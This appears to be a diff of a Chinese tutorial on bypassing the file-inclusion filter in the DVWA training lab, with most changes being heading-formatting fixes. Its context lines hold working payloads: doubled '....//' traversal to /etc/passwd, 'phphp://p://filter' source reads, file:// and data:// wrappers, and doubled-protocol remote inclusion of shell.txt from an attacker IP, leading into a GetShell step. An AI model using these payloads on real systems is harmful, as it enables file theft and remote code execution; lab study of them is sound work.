@@ -37,7 +37,7 @@ include($file);
 
 ## 三、本地文件包含绕过
 
-### 1\. 使用绝对路径
+### 1. 使用绝对路径
 
 过滤只针对 `../` 和 `..`，不针对绝对路径。因此可以直接包含：
 
@@ -53,7 +53,7 @@ include($file);
 ?page=C:\Windows\win.ini
 ```
 
-### 2\. 双写绕过 `../` 过滤
+### 2. 双写绕过 `../` 过滤
 
 过滤将 `../` 替换为空。如果输入 `....//`，字符串中第 3-5 个字符恰好是 `../`，会被替换为空，剩下的字符重新组合成 `../`。
 
@@ -80,11 +80,11 @@ Payload 示例：
 ../../../../etc/passwd
 ```
 
-### 3\. 使用 `..././` 或其他变体
+### 3. 使用 `..././` 或其他变体
 
 虽然 `..././` 不包含 `../` 子串，但文件系统解析时可能等价于 `../`，具体取决于系统。更可靠的是使用 `....//`。
 
-### 4\. 使用 `php://filter` 双写绕过
+### 4. 使用 `php://filter` 双写绕过
 
 `php://` 被过滤，可以双写：
 
@@ -100,7 +100,7 @@ Payload：
 ?page=phphp://p://filter/convert.base64-encode/resource=index.php
 ```
 
-### 5\. 使用 `file://` 协议
+### 5. 使用 `file://` 协议
 
 `file://` 不在过滤列表中，可以包含本地文件：
 
@@ -108,7 +108,7 @@ Payload：
 ?page=file:///etc/passwd
 ```
 
-### 6\. 使用 `data://` 协议
+### 6. 使用 `data://` 协议
 
 `data://` 不在过滤列表中，如果 `allow_url_include` 开启，可以直接执行代码：
 
@@ -118,7 +118,7 @@ Payload：
 
 ## 四、远程文件包含绕过
 
-### 1\. 双写绕过 `http://`
+### 1. 双写绕过 `http://`
 
 过滤将 `http://` 替换为空。可以构造：
 
@@ -134,7 +134,7 @@ Payload：
 ?page=hthttp://tp://攻击者IP/shell.txt
 ```
 
-### 2\. 使用 `https://` 双写
+### 2. 使用 `https://` 双写
 
 类似地：
 
@@ -142,7 +142,7 @@ Payload：
 ?page=hhttps://ttps://攻击者IP/shell.txt
 ```
 
-### 3\. 使用大小写绕过
+### 3. 使用大小写绕过
 
 `str_replace` 区分大小写，因此 `HTTP://` 不会被替换。但某些服务器可能不识别大写协议，需测试。
 
@@ -150,13 +150,13 @@ Payload：
 ?page=HTTP://攻击者IP/shell.txt
 ```
 
-### 4\. 使用其他协议
+### 4. 使用其他协议
 
 如果 `ftp://` 被过滤，可以尝试 `ftps://`、`sftp://` 等，但需服务器支持。
 
 ## 五、完整利用流程
 
-### 1\. 确认 LFI
+### 1. 确认 LFI
 
 ```text
 http://靶机IP/dvwa/vulnerabilities/fi/?page=....//....//....//....//etc/passwd
@@ -164,7 +164,7 @@ http://靶机IP/dvwa/vulnerabilities/fi/?page=....//....//....//....//etc/passwd
 
 页面显示 `/etc/passwd` 内容，说明 LFI 绕过成功。
 
-### 2\. 读取源码
+### 2. 读取源码
 
 ```text
 http://靶机IP/dvwa/vulnerabilities/fi/?page=phphp://p://filter/convert.base64-encode/resource=index.php
@@ -172,7 +172,7 @@ http://靶机IP/dvwa/vulnerabilities/fi/?page=phphp://p://filter/convert.base64-
 
 得到 Base64 编码的源码。
 
-### 3\. RFI GetShell
+### 3. RFI GetShell
 
 在攻击机准备 `shell.txt`：
 
